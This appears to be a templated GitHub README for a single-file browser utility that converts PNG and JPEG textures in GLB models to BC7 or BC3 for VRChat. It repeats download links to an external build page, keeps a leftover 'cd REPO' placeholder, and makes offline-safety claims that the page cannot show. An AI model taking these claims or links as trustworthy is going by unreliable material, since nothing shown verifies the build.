# VRChat 3D Model Texture Reconverter - 3D Model Texture Converter 2026

> **A self-contained browser utility that converts PNG and JPEG textures inside GLB models into BC7 or BC3 (DXT5), with the current version designed to run locally and offline.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carter-woodhyqm8163/vrchat-bc7-texture-reconverter?style=flat-square)](https://github.com/carter-woodhyqm8163/vrchat-bc7-texture-reconverter)

---

<p align="center">
  <a href="https://carter-woodhyqm8163.github.io/vrchat-bc7-texture-reconverter/">
    <img src="https://img.shields.io/badge/Download-VRChat%203D%20Model%20Texture%20Reconverter%20Latest-brightgreen?style=for-the-badge" alt="Download VRChat 3D Model Texture Reconverter">
  </a>
</p>

> **[Download VRChat 3D Model Texture Reconverter](https://carter-woodhyqm8163.github.io/vrchat-bc7-texture-reconverter/)**

---

[Download Latest Build](https://carter-woodhyqm8163.github.io/vrchat-bc7-texture-reconverter/)

---

## Overview

VRChat 3D Model Texture Reconverter is a standalone HTML application for changing the texture data stored in GLB files. It reads embedded PNG and JPEG images and converts them to GPU texture formats such as BC7 and BC3 (DXT5).

The entire tool is provided as one HTML file. Open it in a compatible modern browser and begin working without installing a server or preparing a development environment. Its drag-and-drop design provides a convenient local workflow for VRChat model and texture tasks.

---

## Highlights

- Processes PNG images embedded in GLB models
- Processes JPEG images embedded in GLB models
- Converts textures to BC7
- Converts textures to BC3 (DXT5)
- Runs directly from a standalone HTML document
- Performs conversion offline without server access or network requests
- Supports drag-and-drop file input
- Writes `EXT_voyage_exporter` metadata into converted GLB files

---

## Getting Started

### Download the standalone HTML application

1. Visit the [latest build](https://carter-woodhyqm8163.github.io/vrchat-bc7-texture-reconverter/).
2. Save the HTML file locally.
3. Open it with a modern web browser.

### Use the repository source

```bash
git clone https://github.com/carter-woodhyqm8163/vrchat-bc7-texture-reconverter.git
cd REPO
```

After cloning, open the primary HTML file directly in your browser. A server and package installation are not needed.

---

## Converting a GLB

1. Open the standalone HTML file.
2. Drop a GLB model into the designated drop area.
3. Select an output texture format, including BC7 or BC3 (DXT5).
4. Begin the conversion process.
5. Save the generated GLB after processing finishes.
6. Continue using the converted model in your 3D pipeline.

Only PNG and JPEG texture data contained in the selected GLB is processed.

---

## Settings and Configuration

No separate configuration file is used. The HTML interface provides the format selector and the available file-processing controls.

Since the converter operates locally inside the browser, it does not need an account, server settings, or a network endpoint.

---

## Requirements

- A modern browser capable of running standalone HTML applications
- A GLB model containing PNG or JPEG textures
- Enough local disk space for the original and converted files
- No server runtime
- No network connection while conversion is running

---

## Frequently Asked Questions

### Is an internet connection needed?

No. The standalone HTML application is intended for offline use and does not make network requests during conversion.

### What files can be used as input?

The input must be a GLB file with PNG or JPEG textures.

### Which texture formats can be produced?

The converter supports BC7 and BC3 (DXT5).

### Does the project require dependencies or an installer?

No. Either download the HTML application or clone the repository, then open the HTML file in a compatible browser.

### Where does the tool keep its settings?

Settings are managed through the browser interface. There is no separate settings file or server configuration.

### What can I check if conversion will not begin?

Verify that the chosen file is a GLB model and that it contains PNG or JPEG texture data. If necessary, reload the HTML application and repeat the drag-and-drop step.

### How can I find newer versions?

Look in the repository or visit the [latest build](https://carter-woodhyqm8163.github.io/vrchat-bc7-texture-reconverter/) to check for an updated HTML utility.

---

## Future Improvements

- Further develop the standalone browser-based workflow
- Add more texture conversion choices where practical
- Improve GLB texture metadata processing
- Provide clearer progress and processing feedback

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
